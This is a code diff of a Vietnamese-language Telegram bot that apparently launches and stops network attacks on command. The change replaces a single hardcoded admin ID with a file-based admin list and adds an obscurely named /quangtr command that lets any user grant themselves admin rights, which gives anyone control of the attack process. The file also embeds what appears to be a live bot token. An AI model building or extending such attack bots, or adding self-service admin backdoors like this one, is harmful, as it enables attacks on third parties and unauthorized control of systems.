@@ -6,12 +6,26 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
 TELEGRAM_BOT_TOKEN = "7566533314:AAHaYpNzERykihJBDlt0N-Pzbf5cWLBmko0"
-ADMIN_USER_ID = 6142730696  # Thay đổi thành ID Telegram của bạn
+ADMIN_FILE = "admins.txt"  # Lưu danh sách admin vào file
 USERS_FILE = "users.txt"
 attack_in_progress = False
 attack_process = None  # Lưu trữ tiến trình tấn công
 
-# Tải danh sách người dùng từ tệp
+# Tải danh sách admin từ file
+def load_admins():
+    try:
+        with open(ADMIN_FILE) as f:
+            return set(line.strip() for line in f)
+    except FileNotFoundError:
+        return set()
+
+def save_admins(admins):
+    with open(ADMIN_FILE, "w") as f:
+        f.writelines(f"{admin}\n" for admin in admins)
+
+admins = load_admins()
+
+# Tải danh sách người dùng từ file
 def load_users():
     try:
         with open(USERS_FILE) as f:
@@ -33,11 +47,24 @@ async def start(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
 
+async def quangtr(update: Update, context: CallbackContext):
+    """Lệnh này cho phép người dùng tự thêm mình làm admin"""
+    chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
+
+    if user_id in admins:
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Bạn đã là admin rồi!*", parse_mode="Markdown")
+    else:
+        admins.add(user_id)
+        save_admins(admins)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Bạn đã trở thành admin!*", parse_mode="Markdown")
+
 async def manage(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
     args = context.args
 
-    if chat_id != ADMIN_USER_ID:
+    if user_id not in admins:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
         return
 
@@ -121,7 +148,7 @@ async def stop(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = str(update.effective_user.id)
 
-    if int(user_id) != ADMIN_USER_ID:
+    if user_id not in admins:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
         return
 
@@ -130,11 +157,9 @@ async def stop(update: Update, context: CallbackContext):
         return
 
     try:
-        # Gửi tín hiệu SIGINT (CTRL+C)
         os.kill(attack_process.pid, signal.SIGINT)
-        await asyncio.sleep(1)  # Chờ dừng hoàn toàn
+        await asyncio.sleep(1)
 
-        # Nếu tiến trình vẫn chạy, buộc dừng
         if attack_process.returncode is None:
             os.kill(attack_process.pid, signal.SIGKILL)
 
@@ -145,15 +170,11 @@ async def stop(update: Update, context: CallbackContext):
 
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Lỗi khi dừng tấn công: {str(e)}*", parse_mode="Markdown")
-        
-async def get_id(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    await context.bot.send_message(chat_id=chat_id, text=f"ID của bạn là: {user_id}")
-    
+
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("quangtr", quangtr))
     application.add_handler(CommandHandler("manage", manage))
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("stop", stop))
